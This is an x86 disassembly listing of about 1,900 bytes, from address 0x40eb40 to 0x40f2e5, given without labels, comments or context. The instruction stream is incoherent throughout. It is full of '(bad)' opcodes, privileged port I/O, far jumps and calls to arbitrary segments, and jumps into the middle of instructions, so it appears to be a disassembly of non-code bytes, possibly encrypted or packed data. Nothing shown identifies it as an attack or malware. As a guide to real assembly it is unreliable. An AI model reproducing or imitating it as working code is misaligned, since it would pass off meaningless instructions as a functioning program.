  40eb40:	test   al,0xa5
  40eb42:	cmp    esp,ebp
  40eb44:	ja     0x40ebba
  40eb46:	retf   0xa22a
  40eb49:	sbb    DWORD PTR [ecx-0x53],eax
  40eb4c:	mov    ds:0x2f9a2a23,al
  40eb51:	(bad)  
  40eb52:	sub    DWORD PTR [esi+0x22],eax
  40eb55:	dec    ecx
  40eb56:	test   eax,0x8196ffaa
  40eb5b:	lock jae 0x40eb3a
  40eb5e:	cmp    ebx,0x3d
  40eb61:	mov    WORD PTR [ecx+0x18],fs
  40eb64:	sbb    edi,DWORD PTR [eax]
  40eb66:	adc    ch,BYTE PTR [esi+0x365efba5]
  40eb6c:	add    ebx,ebp
  40eb6e:	mov    bl,BYTE PTR [edx]
  40eb70:	or     eax,0x1ae24be0
  40eb75:	push   edi
  40eb76:	pop    edx
  40eb77:	sub    ebp,DWORD PTR [esi]
  40eb79:	ja     0x40ebad
  40eb7b:	loop   0x40eb1e
  40eb7d:	ins    BYTE PTR es:[edi],dx
  40eb7e:	div    BYTE PTR [edi-0x1f309602]
  40eb84:	and    al,0x7b
  40eb86:	jbe    0x40ebdc
  40eb88:	or     ebx,DWORD PTR [ecx]
  40eb8a:	adc    BYTE PTR [edi-0xb],ah
  40eb8d:	xor    DWORD PTR [eax],esi
  40eb8f:	sub    eax,0x1a8de5ad
  40eb94:	dec    ebx
  40eb95:	icebp  
  40eb96:	jle    0x40eba3
  40eb98:	jmp    0x584e1633
  40eb9d:	jg     0x40eb48
  40eb9f:	sub    BYTE PTR [eax+0x337e4bf8],0xee
  40eba6:	inc    eax
  40eba7:	xchg   edx,eax
  40eba8:	xchg   edx,eax
  40eba9:	dec    ebp
  40ebaa:	pop    ds
  40ebab:	mov    bl,0xdf
  40ebad:	xor    eax,0x5cde72e4
  40ebb2:	stos   DWORD PTR es:[edi],eax
  40ebb3:	push   ss
  40ebb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebb5:	cmp    al,0x26
  40ebb7:	pop    ecx
  40ebb8:	sub    al,0xd1
  40ebba:	fs (bad) 
  40ebbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebbd:	shr    BYTE PTR [ebx],0xfb
  40ebc0:	dec    ebx
  40ebc1:	mov    esp,0x736acad7
  40ebc6:	pop    es
  40ebc7:	xor    al,0x4d
  40ebc9:	jecxz  0x40ebee
  40ebcb:	sub    al,0x6c
  40ebcd:	xor    BYTE PTR [ecx-0x1e65fb55],0x42
  40ebd4:	sub    al,0x9
  40ebd6:	xor    ch,BYTE PTR ds:0x9441fb7e
  40ebdc:	je     0x40eb6f
  40ebde:	ret    0xf668
  40ebe1:	mov    DWORD PTR [ebx-0x24808b85],edx
  40ebe7:	push   esi
  40ebe8:	xor    esp,DWORD PTR ds:[edi-0x31]
  40ebec:	xor    eax,0xdb011a66
  40ebf1:	push   0x59300c9f
  40ebf6:	ss jbe 0x40ebc3
  40ebf9:	call   0xddcb7ef3
  40ebfe:	mov    cl,0xe6
  40ec00:	sbb    ch,BYTE PTR [esi+0x1abb9742]
  40ec06:	shr    dh,0xdd
  40ec09:	or     eax,0x4d50a66
  40ec0e:	adc    al,0xed
  40ec10:	push   esp
  40ec11:	popf   
  40ec12:	mov    al,0x9
  40ec14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec15:	pop    ecx
  40ec16:	push   ebx
  40ec17:	test   al,0x43
  40ec19:	iret   
  40ec1a:	shl    DWORD PTR [ecx+0x6d],1
  40ec1d:	jecxz  0x40ec2d
  40ec1f:	mov    al,ds:0x54a80153
  40ec24:	std    
  40ec25:	pop    edx
  40ec26:	pop    edx
  40ec27:	sahf   
  40ec28:	addr16 mov al,0x98
  40ec2b:	mov    ds:0x897ef156,eax
  40ec30:	push   es
  40ec31:	cld    
  40ec32:	xchg   edi,eax
  40ec33:	repz in al,dx
  40ec35:	sti    
  40ec36:	jnp    0x40eca6
  40ec38:	enter  0x5e7c,0xd6
  40ec3c:	loop   0x40ec1e
  40ec3e:	mov    BYTE PTR [edx+0x7c],0x83
  40ec42:	test   DWORD PTR [edx],esi
  40ec44:	in     al,0x57
  40ec46:	sub    dh,bl
  40ec48:	push   es
  40ec49:	repnz sar DWORD PTR [edi+0x71875d70],cl
  40ec50:	out    dx,al
  40ec51:	xchg   ecx,eax
  40ec52:	mov    cl,0x51
  40ec54:	in     eax,dx
  40ec55:	inc    ebp
  40ec56:	pop    ds
  40ec57:	ret    
  40ec58:	sbb    BYTE PTR [esi+ecx*4-0x61],dh
  40ec5c:	mov    ecx,0xe7603c4a
  40ec61:	jnp    0x40ec6e
  40ec63:	add    BYTE PTR [edi],dh
  40ec65:	cmc    
  40ec66:	dec    eax
  40ec67:	test   al,0x73
  40ec69:	mov    ebp,0x6e7b61cb
  40ec6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec6f:	cmp    eax,0x1fc85104
  40ec74:	gs ins DWORD PTR es:[edi],dx
  40ec76:	sub    DWORD PTR [ebp-0x5b34806b],eax
  40ec7c:	xor    DWORD PTR [eax-0x3a],ebx
  40ec7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec80:	mov    dl,0xca
  40ec82:	mov    edi,0xf9406b51
  40ec87:	rcr    al,1
  40ec89:	mov    WORD PTR [ebx+esi*4+0x4603101b],?
  40ec90:	clc    
  40ec91:	ss jo  0x40ec82
  40ec94:	pop    esi
  40ec95:	cmc    
  40ec96:	(bad)  
  40ec97:	std    
  40ec98:	mov    dh,0x78
  40ec9a:	test   ebx,esp
  40ec9c:	clc    
  40ec9d:	outs   dx,DWORD PTR ds:[esi]
  40ec9e:	jge    0x40ec6c
  40eca0:	push   esi
  40eca1:	mov    dh,0x26
  40eca3:	stc    
  40eca4:	retf   0xe790
  40eca7:	pop    edx
  40eca8:	es ins BYTE PTR es:[edi],dx
  40ecaa:	mov    gs,WORD PTR [ecx-0x58a85a77]
  40ecb0:	cmp    al,0x8b
  40ecb2:	jo     0x40ec3d
  40ecb4:	sub    bl,BYTE PTR [esi-0x7ff44289]
  40ecba:	adc    ecx,edi
  40ecbc:	retf   
  40ecbd:	lods   al,BYTE PTR ds:[esi]
  40ecbe:	adc    BYTE PTR [ebp+esi*4+0x1bebac77],dh
  40ecc5:	pusha  
  40ecc6:	dec    edi
  40ecc7:	adc    ebx,DWORD PTR [eax-0x63]
  40ecca:	cs pusha 
  40eccc:	or     BYTE PTR ds:0xd345e851,bh
  40ecd2:	add    eax,0x1e5a7e9
  40ecd7:	xchg   BYTE PTR [esi-0x19],bh
  40ecda:	into   
  40ecdb:	mov    esi,0x335100c8
  40ece0:	mov    al,ds:0x2b11c78d
  40ece5:	sbb    edi,0x74
  40ece8:	jle    0x40eccf
  40ecea:	outs   dx,DWORD PTR ds:[esi]
  40eceb:	into   
  40ecec:	inc    ebp
  40eced:	in     al,0xd0
  40ecef:	push   0x63
  40ecf1:	data16 das 
  40ecf3:	push   edx
  40ecf4:	stos   BYTE PTR es:[edi],al
  40ecf5:	xchg   ebx,eax
  40ecf6:	xchg   ebp,eax
  40ecf7:	stc    
  40ecf8:	icebp  
  40ecf9:	in     eax,dx
  40ecfa:	pop    DWORD PTR [edi-0x6a5e50c4]
  40ed00:	pop    es
  40ed01:	iret   
  40ed02:	xchg   edi,eax
  40ed03:	js     0x40ed12
  40ed05:	cmp    eax,0xa56783f5
  40ed0a:	dec    ebx
  40ed0b:	mov    ecx,0xcc462905
  40ed10:	mov    BYTE PTR [ebx+eax*2-0x3e],ah
  40ed14:	retf   
  40ed15:	pop    ebx
  40ed16:	mov    edx,edx
  40ed18:	add    ecx,DWORD PTR [edi]
  40ed1a:	arpl   cx,di
  40ed1c:	xor    DWORD PTR [edi-0x760d696a],0xffffffd3
  40ed23:	clc    
  40ed24:	outs   dx,DWORD PTR ds:[esi]
  40ed25:	fimul  DWORD PTR ds:0xf554d021
  40ed2b:	pop    bx
  40ed2d:	cmc    
  40ed2e:	fidiv  WORD PTR [ebx-0x5856911a]
  40ed34:	icebp  
  40ed35:	in     eax,0x6e
  40ed37:	retf   
  40ed38:	jae    0x40ed17
  40ed3a:	inc    edx
  40ed3b:	pop    edi
  40ed3c:	add    bh,BYTE PTR ds:0x439e3d86
  40ed42:	ins    DWORD PTR es:[edi],dx
  40ed43:	mov    ah,0xd1
  40ed45:	fild   QWORD PTR [edi+0x63]
  40ed48:	imul   ebx,DWORD PTR [edx+0x34],0x0
  40ed4c:	dec    edi
  40ed4d:	leave  
  40ed4e:	sub    cl,BYTE PTR [ebx+0x50e54de0]
  40ed54:	data16 mov ah,0xbc
  40ed57:	sbb    eax,0x7aa664bf
  40ed5c:	sbb    eax,0xe1467923
  40ed61:	mov    WORD PTR [edx+0x5c21cfbc],es
  40ed67:	and    DWORD PTR [ebx+0x6daf39b7],0x3f
  40ed6e:	cld    
  40ed6f:	lods   eax,DWORD PTR ds:[esi]
  40ed70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed71:	jno    0x40ed3e
  40ed73:	inc    ebx
  40ed74:	mov    edi,0xa2df0f9
  40ed79:	xchg   esp,eax
  40ed7a:	cmovg  ebx,DWORD PTR [eax]
  40ed7d:	retf   
  40ed7e:	jmp    0x40ed6e
  40ed80:	pop    ecx
  40ed81:	adc    al,0x79
  40ed83:	or     BYTE PTR [edi-0x47db26b3],ch
  40ed89:	lock push esi
  40ed8b:	ja     0x40ed6b
  40ed8d:	and    al,0x55
  40ed8f:	sbb    esi,DWORD PTR [ebx+0x3a60212c]
  40ed95:	cmp    BYTE PTR [ebp-0x2466ce37],bh
  40ed9b:	push   edx
  40ed9c:	mov    edi,0xaabaf095
  40eda1:	fnstenv [ecx+0x27]
  40eda4:	in     al,0xbb
  40eda6:	xchg   DWORD PTR ds:0xe0495216,ecx
  40edac:	xor    eax,0xeb6ed342
  40edb1:	mov    edx,0x696794db
  40edb6:	loopne 0x40ed77
  40edb8:	retf   0x53ac
  40edbb:	ins    DWORD PTR es:[edi],dx
  40edbc:	(bad)  
  40edbe:	push   ss
  40edbf:	std    
  40edc0:	jae    0x40edb1
  40edc2:	add    eax,DWORD PTR [ecx+eiz*4]
  40edc5:	call   0xf9ff:0x5eb8466a
  40edcc:	ins    DWORD PTR es:[edi],dx
  40edcd:	jp     0x40ee09
  40edcf:	stos   DWORD PTR es:[edi],eax
  40edd0:	stos   BYTE PTR es:[edi],al
  40edd1:	add    BYTE PTR [edx-0x51149280],bl
  40edd7:	iret   
  40edd8:	cs in  eax,dx
  40edda:	arpl   WORD PTR [eax-0xb292f95],si
  40ede0:	jmp    0x40ee59
  40ede2:	pushf  
  40ede3:	aad    0x2a
  40ede5:	adc    bl,0x69
  40ede8:	xlat   BYTE PTR ds:[ebx]
  40ede9:	jne    0x40eddc
  40edeb:	mov    ebx,0x881ce1be
  40edf0:	nop
  40edf1:	xchg   ebp,eax
  40edf2:	cmp    eax,0x2d699ef9
  40edf7:	pop    es
  40edf8:	test   eax,0x5ccdd76d
  40edfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edfe:	sar    dh,1
  40ee00:	mov    eax,0xcfc27a2
  40ee05:	and    DWORD PTR [edx],edi
  40ee07:	(bad)  
  40ee08:	aad    0x81
  40ee0a:	sub    eax,0xfd0f7dd0
  40ee0f:	mov    ?,WORD PTR [ebx]
  40ee11:	push   ecx
  40ee12:	push   esp
  40ee13:	std    
  40ee14:	push   edi
  40ee15:	or     eax,0x2fe552d
  40ee1a:	inc    ebp
  40ee1b:	jmp    0xea174dae
  40ee20:	jmp    0x8411:0x2b383212
  40ee27:	dec    ebx
  40ee28:	pop    ebp
  40ee29:	push   esp
  40ee2a:	(bad)
  40ee2e:	iret   
  40ee2f:	push   esp
  40ee30:	imul   esi,DWORD PTR [eax],0x9856550c
  40ee36:	push   0xa0307ca6
  40ee3b:	loopne 0x40edbf
  40ee3d:	sub    BYTE PTR [edi+0x36d3f731],bh
  40ee43:	mov    eax,ds:0xada806ab
  40ee48:	push   es
  40ee49:	xchg   esi,eax
  40ee4a:	or     al,0x7b
  40ee4c:	fisubr DWORD PTR [ebx+0x7b1f675e]
  40ee52:	dec    DWORD PTR [edi+0x41]
  40ee55:	dec    edi
  40ee56:	mov    eax,0x77fd91c2
  40ee5b:	dec    esi
  40ee5c:	pop    eax
  40ee5d:	ficomp WORD PTR [ebx-0x5723a02b]
  40ee63:	ss retf 0xc462
  40ee67:	push   es
  40ee68:	outs   dx,DWORD PTR ds:[esi]
  40ee69:	jle    0x40ee08
  40ee6b:	mov    eax,0xc1ff1f72
  40ee70:	call   0x87141a3d
  40ee75:	pop    esp
  40ee76:	sbb    bh,al
  40ee78:	or     al,0x89
  40ee7a:	push   ds
  40ee7b:	jnp    0x40ee70
  40ee7d:	cmp    DWORD PTR [edi+0x7b9580a4],eax
  40ee83:	sub    DWORD PTR [edi],ecx
  40ee85:	je     0x40ee5e
  40ee87:	add    eax,DWORD PTR es:[ecx-0x636fdc58]
  40ee8e:	mov    edx,0x7fc05e3c
  40ee93:	mov    ecx,0x5d4947b8
  40ee98:	dec    esp
  40ee99:	div    BYTE PTR [ecx]
  40ee9b:	stc    
  40ee9c:	call   0xe1b0b016
  40eea1:	dec    edi
  40eea2:	cs mov ebp,0x6efd5bb0
  40eea8:	sahf   
  40eea9:	lahf   
  40eeaa:	shl    DWORD PTR ds:0xfec7a9f7,1
  40eeb0:	ja     0x40eec2
  40eeb2:	jmp    0xa205:0xbc4d1345
  40eeb9:	jne    0x40ee72
  40eebb:	(bad)  
  40eebc:	(bad)  
  40eebd:	retf   0x94dd
  40eec0:	or     DWORD PTR [eax],eax
  40eec2:	pop    ss
  40eec3:	sbb    ebp,ecx
  40eec5:	outs   dx,BYTE PTR ds:[esi]
  40eec6:	or     esp,0x3711d177
  40eecc:	add    DWORD PTR [ecx],esp
  40eece:	mov    bh,0x51
  40eed0:	fistp  WORD PTR [ecx+0xa]
  40eed3:	add    al,0x21
  40eed5:	lds    esi,FWORD PTR [esi]
  40eed7:	push   edx
  40eed8:	aad    0x40
  40eeda:	addr16 out 0x67,eax
  40eedd:	(bad)  
  40eede:	xlat   BYTE PTR ds:[ebx]
  40eedf:	push   es
  40eee0:	dec    edx
  40eee1:	xchg   bl,cl
  40eee3:	xlat   BYTE PTR ds:[ebx]
  40eee4:	jl     0x40eefa
  40eee6:	stc    
  40eee7:	jmp    0x524a:0x75c1a6f6
  40eeee:	jecxz  0x40eec9
  40eef0:	or     bl,ah
  40eef2:	or     eax,0x8645d3e2
  40eef7:	mov    al,ds:0xfba1958f
  40eefc:	aam    0xc2
  40eefe:	cmp    BYTE PTR [edi-0x5bd4626e],dh
  40ef04:	test   eax,0x3b85ef12
  40ef09:	xchg   ch,ah
  40ef0b:	xchg   ecx,eax
  40ef0c:	dec    eax
  40ef0d:	gs xchg ecx,eax
  40ef0f:	(bad)  
  40ef10:	lods   eax,DWORD PTR ds:[esi]
  40ef11:	leave  
  40ef12:	push   0xffffffd4
  40ef14:	pop    edx
  40ef15:	sbb    BYTE PTR [edi-0x14],0x9f
  40ef19:	push   edx
  40ef1a:	mov    bp,0x6935
  40ef1e:	push   esp
  40ef1f:	add    dh,ch
  40ef21:	sub    eax,0x2aae235e
  40ef26:	(bad)  
  40ef27:	mov    cl,0x13
  40ef29:	add    eax,0x6ba9a033
  40ef2e:	jg     0x40eeec
  40ef30:	jmp    0x40eeb2
  40ef32:	sar    dl,1
  40ef34:	xchg   ebx,eax
  40ef35:	xchg   ebp,eax
  40ef36:	xchg   ecx,eax
  40ef37:	cld    
  40ef38:	mov    ebp,0xbcfdb014
  40ef3d:	and    al,cl
  40ef3f:	inc    esi
  40ef40:	fisubr WORD PTR [ebx-0x69b5d1a6]
  40ef46:	jmp    0xfa4e62d1
  40ef4b:	lds    ebp,FWORD PTR [edx+0xe]
  40ef4e:	clc    
  40ef4f:	stos   DWORD PTR es:[edi],eax
  40ef50:	xchg   DWORD PTR [eax+0x33373973],edx
  40ef56:	(bad)  
  40ef57:	and    esp,DWORD PTR [ebp-0x7c7b467c]
  40ef5d:	mov    edi,0x6ba3552a
  40ef62:	jo     0x40ef29
  40ef64:	xor    DWORD PTR [edi-0x1a],ebp
  40ef67:	mov    ecx,0x1c791db
  40ef6c:	add    DWORD PTR [ecx-0x1a],ebx
  40ef6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef70:	xor    DWORD PTR [edi+0x67e0368f],ebx
  40ef76:	mov    DWORD PTR [esi],ebp
  40ef78:	dec    edi
  40ef79:	sbb    al,0xb9
  40ef7b:	fistp  QWORD PTR [ebp+0x11c4950e]
  40ef81:	sub    DWORD PTR [edi],0x8ac68f2e
  40ef87:	lds    esp,FWORD PTR [ebp-0x76ebefd8]
  40ef8d:	fidivr DWORD PTR [edi-0x13]
  40ef90:	(bad)  [bx+si-0x38]
  40ef94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef95:	adc    eax,0x39a1b970
  40ef9a:	add    al,0x7a
  40ef9c:	ins    DWORD PTR es:[edi],dx
  40ef9d:	jp     0xab7e94b5
  40efa3:	sbb    DWORD PTR [edx-0x1e],ecx
  40efa6:	fs out 0xcf,eax
  40efa9:	xchg   edx,eax
  40efaa:	fld    TBYTE PTR [esi-0x15ede0ef]
  40efb0:	fcmovnbe st,st(6)
  40efb2:	retf   0x5cd3
  40efb5:	loopne 0x40f00a
  40efb7:	xchg   ebx,eax
  40efb8:	loop   0x40ef85
  40efba:	sub    al,BYTE PTR [eax-0x6873eecc]
  40efc0:	or     al,0x49
  40efc2:	jnp    0x40ef7e
  40efc4:	retf   0xecee
  40efc7:	cmp    dh,BYTE PTR [ebx-0x5e]
  40efca:	push   esp
  40efcb:	lods   eax,DWORD PTR ds:[esi]
  40efcc:	cdq    
  40efcd:	xlat   BYTE PTR ds:[ebx]
  40efce:	loop   0x40ef5c
  40efd0:	sub    BYTE PTR [esi+0x62bb8c2a],ch
  40efd6:	add    al,0x29
  40efd8:	dec    esp
  40efd9:	jp     0x40f025
  40efdb:	push   0x8434aa51
  40efe0:	test   eax,0x3839f012
  40efe5:	jnp    0x40ef80
  40efe7:	and    bl,cl
  40efe9:	xchg   BYTE PTR [edx+ecx*1],al
  40efec:	ja     0x40f034
  40efee:	cld    
  40efef:	ja     0x40efef
  40eff1:	sbb    DWORD PTR [ecx],eax
  40eff3:	loope  0x40f029
  40eff5:	aaa    
  40eff6:	fidivr WORD PTR [edx-0x1e94538e]
  40effc:	xor    DWORD PTR [eax+esi*2],edx
  40efff:	push   ss
  40f000:	in     al,dx
  40f001:	outs   dx,BYTE PTR ds:[esi]
  40f002:	pusha  
  40f003:	add    esi,edi
  40f005:	out    0xa7,eax
  40f007:	sub    al,0x7b
  40f009:	push   ebx
  40f00a:	mov    dl,0x7e
  40f00c:	aad    0x68
  40f00e:	and    al,0x34
  40f010:	jne    0x40f014
  40f012:	fcmove st,st(7)
  40f014:	mov    esp,0xdeb81cb9
  40f019:	inc    esp
  40f01a:	aaa    
  40f01b:	adc    esi,DWORD PTR [edi]
  40f01d:	call   0x60e9:0x6ff73dde
  40f024:	aaa    
  40f025:	(bad)  
  40f027:	mov    edi,0x7857086f
  40f02c:	or     edx,ebp
  40f02e:	les    ebx,FWORD PTR [esi]
  40f030:	add    DWORD PTR [ecx-0x25f88b5c],esi
  40f036:	in     eax,dx
  40f037:	cmp    eax,0x84998278
  40f03c:	cmp    eax,0x3de03528
  40f041:	retf   
  40f042:	or     BYTE PTR [ebp-0x781e699b],ah
  40f048:	xchg   esi,eax
  40f049:	jmp    0xc354:0xfc548667
  40f050:	pop    es
  40f051:	and    al,0x1b
  40f053:	iret   
  40f054:	int    0xec
  40f056:	push   cs
  40f057:	inc    edx
  40f058:	xor    DWORD PTR [eax+0x66e14b9f],0xffffffcc
  40f05f:	ja     0x40f087
  40f061:	lahf   
  40f062:	push   es
  40f063:	rcl    dl,1
  40f065:	inc    ebp
  40f066:	loopne 0x40f008
  40f068:	or     ebp,edi
  40f06a:	mov    BYTE PTR [edx+0xc67158b],bh
  40f070:	adc    dl,BYTE PTR [ebp+0xfec77ab]
  40f076:	jge    0x40f044
  40f078:	jmp    0x40f0c6
  40f07a:	mov    ds:0xe35218c9,eax
  40f07f:	(bad)  
  40f080:	jmp    0xa97:0xfef679c5
  40f087:	add    eax,0xd69a5a9f
  40f08c:	pop    es
  40f08d:	arpl   WORD PTR [ecx+0x3a],si
  40f090:	aam    0x2a
  40f092:	push   ecx
  40f093:	loope  0x40f0dc
  40f095:	pop    ds
  40f096:	into   
  40f097:	inc    esi
  40f098:	call   0xfffdf021
  40f09d:	jne    0x40f0a4
  40f09f:	pop    ecx
  40f0a0:	pop    ebx
  40f0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a2:	or     DWORD PTR [edx+ebx*8+0x3956d289],eax
  40f0a9:	std    
  40f0aa:	clc    
  40f0ab:	jnp    0x40f08d
  40f0ad:	in     al,0x78
  40f0af:	fdiv   DWORD PTR [ebx-0x36]
  40f0b2:	mov    cl,BYTE PTR [edi+0x46ff56e5]
  40f0b8:	cs pop ebp
  40f0ba:	pop    eax
  40f0bb:	push   edx
  40f0bc:	jmp    0x6f6bc81e
  40f0c1:	push   edi
  40f0c2:	push   ebx
  40f0c3:	xchg   ebx,eax
  40f0c4:	sbb    cl,BYTE PTR [ecx-0x2a]
  40f0c7:	js     0x40f06e
  40f0c9:	cmp    DWORD PTR [ebx+0x32],0x41
  40f0cd:	mov    eax,ds:0x78beb0c0
  40f0d2:	xor    DWORD PTR [ebx-0x13dc33a7],0x76
  40f0d9:	(bad)  
  40f0da:	out    dx,eax
  40f0db:	mov    eax,ds:0xa106ee64
  40f0e0:	(bad)  
  40f0e1:	test   al,0xe1
  40f0e3:	adc    BYTE PTR [esi-0x4805387b],0x1f
  40f0ea:	xor    bl,bl
  40f0ec:	int3   
  40f0ed:	jp     0x40f0c1
  40f0ef:	push   ss
  40f0f0:	mov    bh,0x79
  40f0f2:	retf   
  40f0f3:	rcl    ah,1
  40f0f5:	in     eax,dx
  40f0f6:	push   esp
  40f0f7:	fnsave [ecx+0xa06e5c2]
  40f0fd:	and    eax,DWORD PTR [edi-0x1a]
  40f100:	fsubr  DWORD PTR [ebp-0x75]
  40f103:	scas   eax,DWORD PTR es:[edi]
  40f104:	scas   eax,DWORD PTR es:[edi]
  40f105:	mov    ebp,0xcc12be0c
  40f10a:	mov    ds:0xd1616c3a,al
  40f10f:	push   esp
  40f110:	popa   
  40f111:	jo     0x40f130
  40f113:	cmp    eax,0x7d9a66aa
  40f118:	mov    bl,0x4d
  40f11a:	fbstp  TBYTE PTR [esi-0x5a3c3b9e]
  40f120:	retf   
  40f121:	ret    
  40f122:	dec    ebx
  40f123:	std    
  40f124:	ficomp WORD PTR [ecx-0x6438914c]
  40f12a:	outs   dx,DWORD PTR ds:[esi]
  40f12b:	bnd jne 0x40f170
  40f12e:	leave  
  40f12f:	aad    0x8f
  40f131:	lahf   
  40f132:	push   0xffffff97
  40f134:	cmp    al,0x99
  40f136:	inc    edx
  40f137:	retf   0xa5e5
  40f13a:	out    0x1c,al
  40f13c:	psubb  mm7,mm0
  40f13f:	neg    BYTE PTR [edi-0x623fae4e]
  40f145:	xchg   esi,eax
  40f146:	loop   0x40f140
  40f148:	fsub   DWORD PTR [edi+eax*4-0x57c07f24]
  40f14f:	xchg   ebp,ebp
  40f151:	fwait
  40f152:	xchg   edx,eax
  40f153:	ret    0xcca8
  40f156:	xor    DWORD PTR [ebp-0x30d1918a],0x6d
  40f15d:	pop    ecx
  40f15e:	lea    edi,[eax]
  40f160:	xchg   edx,eax
  40f161:	fsub   DWORD PTR [edx+0xc]
  40f164:	sub    eax,0x58ad4001
  40f169:	mov    ds:0xfe3dfa0b,eax
  40f16e:	mov    esi,0x5837230
  40f173:	lahf   
  40f174:	jp     0x40f191
  40f176:	leave  
  40f177:	(bad)  
  40f178:	out    dx,al
  40f179:	(bad)  
  40f17a:	leave  
  40f17b:	xrelease mov DWORD PTR [ebx],0xaeb4a8b0
  40f182:	mov    dh,0x69
  40f184:	jmp    0x915e2176
  40f189:	adc    al,0x3f
  40f18b:	jne    0x40f187
  40f18d:	addr16 loope 0x40f203
  40f190:	jle    0x40f149
  40f192:	aaa    
  40f193:	loopne 0x40f1c5
  40f195:	adc    dh,BYTE PTR [ebx+edx*2-0x1e]
  40f199:	and    DWORD PTR [edi+0x41344761],ebp
  40f19f:	fiadd  DWORD PTR [esi+0x407c5aa0]
  40f1a5:	js     0x40f1f4
  40f1a7:	cmc    
  40f1a8:	dec    esp
  40f1a9:	mov    esp,0x196d6c7d
  40f1ae:	outs   dx,BYTE PTR ds:[esi]
  40f1af:	nop
  40f1b0:	mov    ds:0x1de218a,eax
  40f1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1b6:	mov    ebp,0xa5fd4296
  40f1bb:	mov    dl,0x37
  40f1bd:	add    esp,DWORD PTR [edx-0x2f]
  40f1c0:	xor    BYTE PTR [ecx],ah
  40f1c2:	aaa    
  40f1c3:	lds    ecx,FWORD PTR [edx-0x7731727]
  40f1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ca:	sub    DWORD PTR [ebp+0x28],esi
  40f1cd:	bound  bp,DWORD PTR [eax-0x48]
  40f1d1:	push   ds
  40f1d2:	add    eax,0xe4b5eb19
  40f1d7:	push   cs
  40f1d8:	cmp    eax,0x51d72a9
  40f1dd:	ja     0x40f1ac
  40f1df:	stos   BYTE PTR es:[edi],al
  40f1e0:	loop   0x40f1d3
  40f1e2:	pop    ss
  40f1e3:	ss clc 
  40f1e5:	fdivr  st(4),st
  40f1e7:	cdq    
  40f1e8:	fdiv   st(5),st
  40f1ea:	jmp    0xdcb5:0xb1b8e87f
  40f1f1:	dec    ecx
  40f1f2:	add    eax,0xc02d0fed
  40f1f7:	mov    BYTE PTR [ebx-0x143ffe7f],ah
  40f1fd:	pop    ds
  40f1fe:	retf   
  40f1ff:	popf   
  40f200:	or     al,0xd7
  40f202:	out    dx,al
  40f203:	push   ecx
  40f204:	inc    edi
  40f205:	daa    
  40f206:	ret    
  40f207:	sub    al,0x26
  40f209:	mov    BYTE PTR [edi],dh
  40f20b:	paddw  mm6,QWORD PTR [ecx]
  40f20e:	dec    eax
  40f20f:	pop    es
  40f210:	pop    edx
  40f211:	rol    BYTE PTR [edi],cl
  40f213:	fidivr WORD PTR [edi]
  40f215:	inc    ebx
  40f216:	dec    ebx
  40f217:	div    DWORD PTR [ecx]
  40f219:	push   ebx
  40f21a:	sti    
  40f21b:	fsubr  st(3),st
  40f21d:	(bad)  
  40f21e:	xchg   esi,eax
  40f21f:	shr    BYTE PTR [esi-0x481deb54],0xef
  40f226:	lock int 0xbc
  40f229:	iret   
  40f22a:	es mov dl,0x66
  40f22d:	jmp    0x3940d473
  40f232:	jae    0x40f201
  40f234:	arpl   WORD PTR [ebp-0x6e],bp
  40f237:	sbb    DWORD PTR [edi-0xf],ebx
  40f23a:	popf   
  40f23b:	call   0xff99166a
  40f240:	shl    al,cl
  40f242:	xor    al,dl
  40f244:	dec    esi
  40f245:	add    ch,ah
  40f247:	sub    eax,0xfcc84c38
  40f24c:	push   edx
  40f24d:	xchg   ecx,eax
  40f24e:	leave  
  40f24f:	adc    al,0x8d
  40f251:	sbb    al,0x8a
  40f253:	std    
  40f254:	inc    eax
  40f255:	fcmovnbe st,st(1)
  40f257:	loope  0x40f1e2
  40f259:	push   ss
  40f25a:	pop    ss
  40f25b:	mov    eax,0x89491e17
  40f260:	jg     0x40f289
  40f262:	fnstcw WORD PTR [esp+esi*4]
  40f265:	push   eax
  40f266:	mov    al,ds:0xce01b147
  40f26b:	imul   eax
  40f26d:	xchg   ebp,eax
  40f26e:	mov    ch,0xba
  40f270:	jg     0x40f233
  40f272:	or     ah,BYTE PTR [ecx-0x7cb43d4e]
  40f278:	push   ss
  40f279:	push   esi
  40f27a:	lods   al,BYTE PTR ds:[esi]
  40f27b:	fld    DWORD PTR [edi+0x37]
  40f27e:	push   edx
  40f27f:	sub    al,0x85
  40f281:	jmp    0x938cf959
  40f286:	cmp    eax,0x1e37d0ad
  40f28b:	loopne 0x40f255
  40f28d:	scas   eax,DWORD PTR es:[edi]
  40f28e:	mov    ebp,0x9e953f1
  40f293:	jmp    0x6dee:0x3c4f4b80
  40f29a:	add    BYTE PTR [ebp-0x20],dl
  40f29d:	cmp    BYTE PTR [esp+edi*8],dl
  40f2a0:	ret    0xd8be
  40f2a3:	es mov esp,0x758dc331
  40f2a9:	pop    es
  40f2aa:	mov    dl,0x30
  40f2ac:	jmp    0x40f2b6
  40f2ae:	sub    bh,BYTE PTR [eax]
  40f2b0:	repz ss push ecx
  40f2b3:	stos   BYTE PTR es:[edi],al
  40f2b4:	push   ecx
  40f2b5:	or     eax,0xae65c568
  40f2ba:	push   0x6f537aba
  40f2bf:	iret   
  40f2c0:	lahf   
  40f2c1:	add    eax,0xac8bb32a
  40f2c6:	inc    ecx
  40f2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c8:	inc    esp
  40f2c9:	loope  0x40f307
  40f2cb:	cli    
  40f2cc:	push   esi
  40f2cd:	sbb    DWORD PTR [eax-0x1e6b2a0c],ebp
  40f2d3:	xchg   DWORD PTR [esi+edi*2-0x2b2d3a06],eax
  40f2da:	sti    
  40f2db:	mov    dl,0xe9
  40f2dd:	loop   0x40f269
  40f2df:	fsubr  st(0),st
  40f2e1:	jmp    DWORD PTR [ecx+esi*1-0x1f]
  40f2e5:	cs sub eax,0x72e1ceaf
